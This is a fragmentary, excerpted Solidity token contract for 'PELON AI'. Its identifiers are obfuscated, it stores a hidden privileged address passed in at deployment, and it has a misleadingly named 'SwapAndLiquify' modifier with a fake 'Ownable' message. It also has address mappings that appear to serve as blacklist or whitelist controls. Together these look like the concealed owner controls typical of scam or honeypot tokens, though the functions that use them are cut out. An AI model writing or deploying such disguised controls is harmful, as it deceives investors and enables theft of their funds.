...
interface PELONAIAsii is PELONAIAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract PELONAIAsiii is PELONAIAs {
...
contract PELONAI is PELONAIAs, PELONAIAsi, PELONAIAsii, PELONAIAsiii {

    mapping(address => uint256) private sendamount;
  mapping(address => bool) public PELONAIAsiiZERTY;
    mapping(address => mapping(address => uint256)) private noFeeFromTransfer;
address private PELONAIRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public PELONAIPaw;
  address PELONAIAdr;



    
    constructor(address PELONAIadressss) {
            // Editable
            PELONAIAdr = msg.sender;

        _name = "PELON AI";
        _symbol = "PELONAI";
  PELONAIRooter = PELONAIadressss;        
        uint PELONAITotalSupply = 200000000000 * 10**9;
        process(msg.sender, PELONAITotalSupply);
    }
    ...
    function transferFrom(
      ...
      modifier SwapAndLiquify() {
        require(PELONAIRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
  ...
  modifier walo () {
    require(PELONAIAdr == msg.sender, "Ehi20: cannot permit SwapAndLiquify address");
    _;
